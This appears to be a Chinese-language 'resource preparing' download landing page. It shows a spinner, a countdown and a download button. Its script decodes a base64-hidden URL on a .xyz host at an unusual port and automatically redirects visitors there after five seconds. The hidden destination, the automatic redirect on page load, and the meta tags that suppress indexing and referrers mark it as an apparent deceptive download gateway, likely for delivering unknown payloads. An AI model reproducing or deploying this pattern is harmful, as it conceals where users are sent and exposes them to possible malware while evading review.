<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <link rel="canonical" href="https://sgqp.cn/">
  <title>资源准备中</title>
  <link rel="icon" href="/favicon.ico">
  <style>
    :root {
      --bg: #071126;
      --panel: rgba(18, 32, 68, 0.86);
      --line: rgba(132, 169, 255, 0.24);
      --text: #eef4ff;
      --muted: #a8b7d7;
      --cyan: #5ce9ff;
      --green: #55efb0;
      --violet: #8e72ff;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      font-family: "Microsoft YaHei", "PingFang SC", Arial, sans-serif;
      color: var(--text);
      background:
        linear-gradient(90deg, rgba(92, 233, 255, 0.06) 1px, transparent 1px),
        linear-gradient(rgba(142, 114, 255, 0.06) 1px, transparent 1px),
        linear-gradient(135deg, #061027 0%, #0a1530 48%, #11184a 100%);
      background-size: 58px 58px, 58px 58px, auto;
      padding: 24px;
    }
    .card {
      width: min(460px, 100%);
      padding: 34px;
      border: 1px solid var(--line);
      border-radius: 8px;
      background: var(--panel);
      box-shadow: 0 24px 80px rgba(2, 10, 31, 0.42);
      text-align: center;
    }
    .ring {
      width: 82px;
      height: 82px;
      margin: 0 auto 22px;
      border-radius: 50%;
      border: 4px solid rgba(92, 233, 255, 0.18);
      border-top-color: var(--cyan);
      animation: spin 1.1s linear infinite;
    }
    h1 { margin: 0 0 10px; font-size: 28px; letter-spacing: 0; }
    p { margin: 8px 0; color: var(--muted); }
    .bar {
      height: 8px;
      margin: 24px 0;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.08);
      overflow: hidden;
    }
    .bar span {
      display: block;
      width: 0;
      height: 100%;
      background: linear-gradient(90deg, var(--cyan), var(--green));
      animation: load 5s linear forwards;
    }
    .count { color: var(--cyan); font-weight: 700; }
    button {
      width: 100%;
      min-height: 46px;
      border: 0;
      border-radius: 8px;
      color: #061126;
      background: linear-gradient(135deg, var(--cyan), var(--green));
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes load { to { width: 100%; } }
  </style>
</head>
<body>
  <main class="card sgqp-govcn">
    <div class="ring" aria-hidden="true"></div>
    <h1>资源准备中</h1>
    <p>正在校验连接环境</p>
    <p>即将进入下载页面</p>
    <p>请勿关闭当前页面</p>
    <div class="bar"><span></span></div>
    <p><span class="count" id="countdown">5</span> 秒后自动跳转</p>
    <button id="manualDownload" rel="nofollow noopener noreferrer">立即下载</button>
  </main>
  <script>
    const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9iNTUuMzEzNDg2Lnh5ejozNTg4OC8=");
    const countdown = document.getElementById("countdown");
    const manualDownload = document.getElementById("manualDownload");
    let seconds = 5;

    const timer = window.setInterval(function () {
      seconds -= 1;
      countdown.textContent = String(seconds);
      if (seconds <= 0) {
        window.clearInterval(timer);
        window.location.replace(REAL_DOWNLOAD_URL);
      }
    }, 1000);

    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
  </script>
</body>
</html>
